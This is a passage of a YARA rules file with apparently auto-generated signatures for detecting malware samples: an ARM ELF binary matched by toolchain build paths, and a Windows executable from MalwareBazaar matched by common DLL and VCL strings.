        $s19 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S"
        $s20 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 176KB and
        all of them
}

rule Windows_eae6712c11dd6f02554e9670d81d55426c6c0590480ae08c281edc596615ea30
{
    meta:
        description = "Auto ML: eae6712c11dd6f02554e9670d81d55426c6c0590480ae08c281edc596615ea30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "oleaut32.dll"
        $s3 = "ssShift"
        $s4 = "TBitmapImage"
        $s5 = "USER32.DLL"
        $s6 = "comctl32.dll"
        $s7 = "uxtheme.dll"
        $s8 = "MAPI32.DLL"
        $s9 = "imm32.dll"
        $s10 = "OnDrawItemp"
        $s11 = "ssHotTrack"
        $s12 = "vcltest3.dll"
        $s13 = "User32.dll"
        $s14 = "PieValues<"
        $s15 = "DeleteCriticalSection"
        $s16 = "user32.dll"
        $s17 = "advapi32.dll"
        $s18 = "GlobalDeleteAtom"
        $s19 = "version.dll"
        $s20 = "gdi32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 2082KB and
        all of them
}
